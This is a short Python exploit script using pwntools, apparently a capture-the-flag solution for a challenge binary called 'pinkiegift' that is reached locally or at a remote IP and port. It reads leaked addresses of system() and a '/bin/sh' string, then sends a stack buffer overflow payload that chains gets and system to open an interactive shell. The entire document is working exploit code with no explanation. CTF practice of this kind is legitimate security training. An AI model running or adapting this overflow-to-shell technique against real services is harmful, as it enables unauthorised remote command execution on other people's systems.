from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pinkiegift")
else:
	p = remote("95.179.163.167",10006)

context.log_level = "debug"
p.recvuntil("Santa: ")
#gdb.attach(p,"b *0x080485DE\nb *0x08048607")
info = p.recvuntil("\n",drop=True)
binsh = int(info.split(" ")[0],16)
system_addr = int(info.split(" ")[1],16)
gets_addr = 0x080483D0
payload = "a"*(0x84 + 4) + p32(gets_addr) + p32(system_addr) + p32(binsh) + p32(binsh)
p.sendline("b")
p.sendlineafter("b",payload)
p.sendline("/bin/sh\x00")
p.interactive()
